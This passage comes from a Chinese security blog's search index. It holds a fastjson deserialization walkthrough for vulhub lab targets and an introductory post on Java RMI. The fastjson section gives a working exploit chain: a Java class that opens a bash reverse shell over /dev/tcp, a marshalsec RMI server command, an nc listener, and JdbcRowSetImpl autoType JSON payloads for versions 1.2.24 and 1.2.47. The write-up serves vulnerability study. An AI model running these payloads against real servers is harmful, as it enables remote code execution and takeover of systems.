3$M$C$A$A\\\"\\n\" +\n                \"        }\\n\" +\n                \"    }: \\\"key\\\"\\n\" +\n                \"}\";\n        JSON.parse(payload);\n    }\n}\n```\n\n在上面的代码中的`driverClassName`字段，就是使用BCEL转换后的字节码\n\n执行结果如下图：\n\n![image-20230719204420503](image-20230719204420503.png)\n\n因作者代码审计能力过于薄弱，具体的代码分析可以参考文章：https://www.anquanke.com/post/id/248892#h2-1\n\n\n\n# 结尾\n\n文章参考：\n\n> https://www.anquanke.com/post/id/248892#h2-1\n>\n> https://www.cnblogs.com/R0ser1/p/15918626.html\n","tags":["渗透","红队","fastjson","Java漏洞","漏洞复现"],"categories":["stcs"]},{"title":"fastjson反序列化漏洞","url":"/stcs/2023/07/e08e901851f2/","content":"\n# 前言\n\n## 什么是fastjson\n\n{% label fastjson blue %}是一个由阿里开发的开源Java类库，可以将Java对象转换为JSON格式；当然，它也可以将JSON字符串转换为Java对象。fastjson可以操作任何Java对象，即使是一些预先存在的没有源码的对象，fastjson也可以进行操作。所以它的使用是很广泛的。\n\n## 什么是序列化和反序列化\n\n序列化就是将一个对象转换成JSON字符串的过程，而反序列化就是将JSON字符串转换成对象的过程。\n\n\n\n# AutoType\n\n在进行漏洞复现之前，先来了解一下fastjson的{% label AutoType blue%}的机制\n\n## 概念\n\nfastjson引入了{% label @AutoType blue%}的注解，fastjson在读取json字符串并进行反序列化操作时，会读取到json字符串中的{% label @type blue %}的内容，将json字符串的内容反序列化为Java对象并调用这个对象所属类的setter方法。\n\n> 当然，漏洞产生的原因也是因为这个AutoType的功能。\n\n## 使用原因\n\n既然上文都说了漏洞产生的原因也是在这个AutoType的功能上产生的，那为什么还要使用呢？\n\n其实fastjson在进行转换的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。对于JSON框架来说，想要把一个Java对象转换成字符串。可以使用下面两种方法进行转换：\n\n1. 基于`getter`和`setter`\n2. AutoType\n\n### 基于`getter`和`setter`\n\n基于`getter`和`setter`来进行序列化和反序列化操作时，当转换后得到对象的类只有一个接口的时候，将这个类的对象进行反序列化操作的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。示例代码如下：\n\n{% tabs store.java %}\n\n<!--tab store.java-->\n\n```java\nimport java.math.BigDecimal;\n\npublic class Store{\n    private String name;\n    private Phone phone;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Phone getPhone() {\n        return phone;\n    }\n\n    public void setPhone(Phone phone) {\n        this.phone = phone;\n    }\n\n    @Override\n    public String toString() {\n        return \"Store{\" +\n                \"name='\" + name + '\\'' +\n                \", phone=\" + phone +\n                '}';\n    }\n}\n\n// 手机的接口\ninterface Phone{\n\n}\n\nclass Apple implements Phone{\n    private BigDecimal price;\n\n    public BigDecimal getPrice() {\n        return price;\n    }\n\n    public void setPrice(BigDecimal price) {\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Apple{\" +\n                \"price=\" + price +\n                '}';\n    }\n}\n```\n\n<!--endtab-->\n\n<!--tab main.java-->\n\n```java\nimport com.alibaba.fastjson.JSON;\n\nimport java.math.BigDecimal;\n\npublic class Main {\n    public static void main(String[] args) {\n//        商店类\n        Store store = new Store();\n        store.setName(\"落星辰\");\n//        苹果手机价格\n        Apple apple = new Apple();\n        apple.setPrice(new BigDecimal(12000));\n//        将苹果手机放入商店\n        store.setPhone(apple);\n//        序列化操作\n        String s = JSON.toJSONString(store);\n        System.out.println(\"-----现在执行序列化操作-----\");\n        System.out.println(\"序列化：\" + s);\n        System.out.println(\"---------------------------\\n\\n\\n\");\n//        反序列化操作\n        Store ns = JSON.parseObject(s, Store.class);\n        System.out.println(\"-----现在执行反序列化操作-----\");\n        System.out.println(\"反序列化：\" + ns);\n        Apple a = (Apple) ns.getPhone();\n        System.out.println(\"获取苹果手机： \" + a);\n        System.out.println(\"---------------------------\");\n    }\n}\n\n```\n\n<!--endtab-->\n\n{% endtabs %}\n\n代码执行结果如下：\n\n![image-20230709162454451](image-20230709162454451.png)\n\n通过运行结果我们可以得出：在进行反序列化操作后，我们尝试将Phone类型转换为Apple类型，但是抛出了异常，而转换成Phone却不会抛出异常：\n\n```java\n        Phone a = (Phone) ns.getPhone();\n        System.out.println(\"获取苹果手机： \" + a);\n```\n\n运行结果如下：\n\n![image-20230709163301530](image-20230709163301530.png)\n\n### 使用AutoType\n\n为了解决上面的问题，fastjson引入了AdutoType的功能，它会在序列化的时候，把原始类型记录下来。\n\n我们只需要将上面代码中序列化的操作加上参数`SerializerFeature.WriteClassName`，它会把原始类型标记下来。下面是修改代码前后比对：\n\n{% tabs 修改前 %}\n\n<!--tab 修改前-->\n\n```java\n        String s = JSON.toJSONString(store);\n```\n\n<!--endtab-->\n\n<!--tab 修改后-->\n\n```java\n        String s = JSON.toJSONString(store, SerializerFeature.WriteClassName);\n```\n\n<!--endtab-->\n\n{% endtabs %}\n\n修改之后的运行结果如下：\n\n![image-20230709164210557](image-20230709164210557.png)\n\n我们可以看到，输出序列化的JSON字符串的时候，多了一个`@type`的字段，标记了类对应的原始类型，这样方便了在反序列化的时候定位到具体类型。\n\n> 这就是AutoType的功能，以及fastjson中使用AutoType的原因。\n\n# 漏洞原理\n\n因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。\n\n因为AutoType在设计之初时，安全方面考虑不周全，我们就可以利用这个特性，去构造一个JSON字符串，并使用`@type`指定一个自己想要攻击的类库。\n\n最常见的就有sun官方提供过的一个`com.sun.rowset.JdbcRowSetImpl`这个类，这个类中有个dataSourceName方法支持传入一个[rmi]({% post_path 'rmi反序列化' %})的源，只要解析其中的url就会支持远程调用。\n\n那么整个漏洞的利用过程就是：\n\n\n\n![image-20230713194942849](image-20230713194942849.png)\n\n# 漏洞复现\n\n> trip: 如何判断是否使用的组件是fastjson可以参考文章：\n>\n> https://blog.csdn.net/qq_18980147/article/details/126653516\n\n## 1.2.24版本\n\n### 开启靶机\n\n靶场使用vulhub搭建，进入fastjson漏洞的目录\n\n![image-20230709183614815](image-20230709183614815.png)\n\n执行命令\n\n```bash\ndocker-compose up -d\n```\n\n执行成功后输入下面命令查看靶机是否启动\n\n```bash\ndocker ps\n```\n\n如果看到下图信息即开启成功\n\n![image-20230709183811800](image-20230709183811800.png)\n\n\n\n启动成功后访问`http://你靶机的ip:8090`即可访问靶机页面\n\n![image-20230709184308892](image-20230709184308892.png)\n\n\n\n### 搭建执行恶意命令的服务器\n\n> 在搭建服务器前，得先搭建Java,maven和rmi服务的环境。搭建文章如下：\n>\n> 搭建Java环境：\n>\n> https://blog.csdn.net/qq_45009837/article/details/126055165\n>\n> 搭建maven环境：\n>\n> https://blog.csdn.net/qq_45867375/article/details/124730372\n>\n> 搭建rmi服务：\n>\n> https://blog.csdn.net/m0_54899775/article/details/122485232\n\n搭建步骤如下：\n\n{% tabs step1 %}\n\n<!--tab step1-->\n\n编写一个恶意类，代码如下：\n\n```java\npublic class Shell {\n    static {\n        try{\n//            获取runtime对象\n            Runtime r = Runtime.getRuntime();\n            String[] commands = {\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/192.168.74.130/7178 0>&1\"};\n            Process p = r.exec(commands);\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n编写完成后，使用javac进行编译：\n\n```bash\njavac Shell.java\n```\n\n编译完成后，目录内容是这样的：\n\n![image-20230712115005969](image-20230712115005969.png)\n\n<!--endtab-->\n\n\n\n<!--tab step2-->\n\n使用python启动web服务，执行以下命令：\n\n```bash\npython3 -m http.server 4433\n```\n\n执行成功后结果如下：\n\n![image-20230712115341348](image-20230712115341348.png)\n\n访问页面如下：\n\n![image-20230712115403446](image-20230712115403446.png)\n\n<!--endtab-->\n\n\n\n<!--tab step3-->\n\n启动http服务之后，启动rmi服务器\n\n在marshalsec的目录下执行如下命令：\n\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.74.130:4433/#Shell\" 9999\n```\n\n\n\n> 注意：引号那里是根据你开启的http服务器的IP和构造的恶意类决定的。例如你开启HTTP服务的IP是192.168.3.39，端口是6677，构造的恶意类的类名是AABB，那么你的RMI执行远程代码的地址就是：`http://192.168.3.39:6677/#AABB`\n\n执行完成后显示如下信息即表示开启成功：\n\n![image-20230712120233757](image-20230712120233757.png)\n\n<!--endtab-->\n\n\n\n<!--tab step4-->\n\n在你代码中反弹shell的那个IP对应的电脑上输入如下命令来监听端口：\n\n```bash\nnc -lvvp 7178\n```\n\n执行成功后会显示如下信息：\n\n![image-20230712120416565](image-20230712120416565.png)\n\n<!--endtab-->\n\n{% endtabs %}\n\n\n\n### 反弹 shell\n\n刷新靶机页面`http://你靶机的ip:8090`并用burp抓包，将数据包进行修改：\n\n- 将请求方法改成POST\n- 添加如下json数据：\n\n```json\nContent-Type: application/json\nContent-Length: 168\n\n{\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://192.168.74.130:9999/Shell\",\n        \"autoCommit\":true\n    }\n \n}\n```\n\n> 注意：rmi的地址改成部署的rmi的IP和端口\n\n响应结果如下：\n\n{% tabs rmi日志 %}\n\n<!--tab rmi日志-->\n\n![image-20230713175230686](image-20230713175230686.png)\n\n<!--endtab-->\n\n<!--tab http日志-->\n\n![image-20230713175450748](image-20230713175450748.png)\n\n<!--endtab-->\n\n<!--tab nc监听-->\n\n![image-20230713175517054](image-20230713175517054.png)\n\n<!--endtab-->\n\n{% endtabs %}\n\n可以看到，已经拿到目标服务器的shell了。\n\n## 1.2.47版本\n\n\n\n步骤还是一样的，只不过靶机的目录不一样了\n\n```bash\ncd vulhub/fastjson/1.2.47-rce/\n```\n\n![image-20230713180615788](image-20230713180615788.png)\n\n进入目录之后执行命令：\n\n```bash\ndocker-compose up -d\n```\n\n开启之后，访问`http://开启靶机的ip地址:8090`即可访问靶机页面\n\n> 上面的步骤几乎一样，这里就跳过了\n\n只需要在修改包的时候把构造的数据修改成下面的数据即可：\n\n```json\nContent-Type: application/json\nContent-Length: 168\n\n{\n    \"a\":{\n        \"@type\":\"java.lang.Class\",\n        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n    },\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://192.168.32.136:9999/Shell\",\n        \"autoCommit\":true\n    }\n \n}\n```\n\n发送成功后，监听的端口依然能够getshell：\n\n![image-20230713182328478](image-20230713182328478.png)\n\n## 结尾\n\n本文参考文章：\n\n- https://juejin.cn/post/6846687594130964488\n\n- https://blog.csdn.net/Bossfrank/article/details/130100893\n\n不同版本fastjson的绕过利用文章(写的很详细)：\n\n- https://www.freebuf.com/vuls/361576.html\n","tags":["渗透","红队","fastjson","Java漏洞","漏洞复现"],"categories":["stcs"]},{"title":"RMI反序列化","url":"/stcs/2023/07/3146666c304a/","content":"\n## 前言\n\n在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。\n\n所以，得先弄清楚RMI等前置知识点再复现fastjson的漏洞，这样能帮助我们更好的理解fastjson漏洞的原理。\n\n## 概念\n\nRMI(远程方法调用，Remote Method Invocation)，在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。它大大增强了Java开发分布式应用的效率，它是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。\n\nJava本身对RMI规范的实现默认是使用JRMP协议，而在Weblogic中对RMI规范的实现使用的是T3协议。\n\n> JRMP: Java Remote Message Protocol，Java远程消息交换协议。在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。\n>\n> T3协议：它是Weblogic里面独有的一个协议，在前面写的一篇关于RMI的文章里面提到过RMI的传输过程是传输的序列化数据，而在接收后会进行一个反序列化的操作。在Weblogic中对RMI规范的实现使用T3协议。而在T3的传输过程也是一样的。\n\n在开发中，RMI分为三大部分，分别为：{% label **Server**(服务器端) blue %}、{% label **Client**(客户端) blue %}和{% label **Registry**(注册表) blue %}。在下面的表格中会有具体的信息：\n\n|   名称   |                       描述                       |\n| :------: | :----------------------------------------------: |\n|  Server  |                  提供远程的对象                  |\n|  Client  |                  调用远程的对象                  |\n| Registry | 存放着远程对象的位置（ip、端口、标识符）的注册表 |\n\n接下来是具体的用例。\n\n## RMI的基础运用\n\n在上文中可以知道，RMI可以调用远程的Java对象进行本地执行。\n\n### 服务器端实现\n\n{% tabs 接口代码 %}\n\n<!--tab 接口代码-->\n\n远程被调用的类必须继承{% label java.rmi.Remote blue %}接口才能使用。下面是具体的代码用例：\n\n```java\npackage com.lxc.server;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\npublic interface RmiTest extends Remote{\n//    这里需要抛出RemoteException的异常\n    public String test() throws RemoteException;\n\n}\n```\n\n> 注意：在定义远程接口时，修饰符必须是`public`，否则会报错；并且需要抛出RemoteException的异常。\n\n<!--endtab-->\n\n<!--tab 接口实现类-->\n\n在编写实现类的时候，实现类需要继承{% label **UnicastRemoteObject** blue %}类。\n\n```java\npackage com.lxc.server.Impl;\n\nimport com.lxc.server.RmiTest;\nimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class RmiTestImpl extends UnicastRemoteObject implements RmiTest {\n    public RmiTestImpl() throws RemoteException {\n        System.out.println(\"这是服务端的构造方法\");\n    }\n\n    @Override\n    public String test() throws RemoteException {\n        System.out.println(\"正在调用远程的方法：test\");\n        return \"test方法调用成功\";\n    }\n}\n```\n\n> 注意：这里必须编写实现类的构造方法，否则会报错\n\n<!--endtab-->\n\n<!--tab 服务端代码-->\n\n现在需要创建一个服务器的实例，并且创建一个注册表，将需要提供给客户端的对象注册上去。\n\n```java\npackage com.lxc.server.example;\n\nimport com.lxc.server.Impl.RmiTestImpl;\nimport com.lxc.server.RmiTest;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n\npublic class RmiExample {\n    public static void main(String[] args) throws RemoteException {\n//        创建服务器对象\n        RmiTest test = new RmiTestImpl();\n//        创建注册表\n        Registry reg = LocateRegistry.createRegistry(6666);\n//        将服务器对象注册到注册表里\n        reg.rebind(\"test\", test);\n    }\n}\n```\n\n<!--endtab-->\n\n{% endtabs %}\n\n\n\n### 客户端实现\n\n下面是一个基础的客户端的实现代码：\n\n```java\npackage com.lxc.client;\n\nimport com.lxc.server.RmiTest;\n\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n\npublic class RmiClient {\n    public static void main(String[] args) throws RemoteException, NotBoundException {\n//        创建注册表对象，并读取服务端写入注册表的内容\n        Registry reg = LocateRegistry.getRegistry(\"localhost\", 6666);\n//        利用注册表中的代理去查询注册表中名为test的对象\n        RmiTest rmiTest = (RmiTest) reg.lookup(\"test\");\n//        调用方法\n        System.out.println(rmiTest.test());\n    }\n}\n```\n\n> 注意：如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。\n\n### 测试\n\n{% tabs 服务端运行 %}\n\n<!--tab 服务端运行-->\n\n首先运行服务器端的代码，启动成功之后输出结果如下：\n\n![image-20230703150831399](image-20230703150831399.png)\n\n<!--endtab-->\n\n<!--tab 客户端运行-->\n\n接下来运行客户端的代码，运行成功之后结果如下：\n\n![image-20230703150925484](image-20230703150925484.png)\n\n<!--tab 服务器运行-->\n\n<!--tab 客户端回显-->\n\n此时服务器端应该显示下面的内容：\n\n![image-20230703150953147](image-20230703150953147.png)\n\n这样就表示运行成功了。\n\n<!--endtab-->\n\n{% endtabs %}\n\n\n\n## 结尾\n\n\n\n> 因作者能力有限，rmi攻击可以查看下面的文章：\n>\n> [JAVA RMI 反序列化攻击 & JEP290 Bypass分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8706)\n\n\n\n> 本文参考文章：\n>\n> https://www.cnblogs.com/nice0e3/p/13927460.html\n>\n> \n","tags":["渗透","红队","Java漏洞","漏洞"],"categories":["stcs"]}]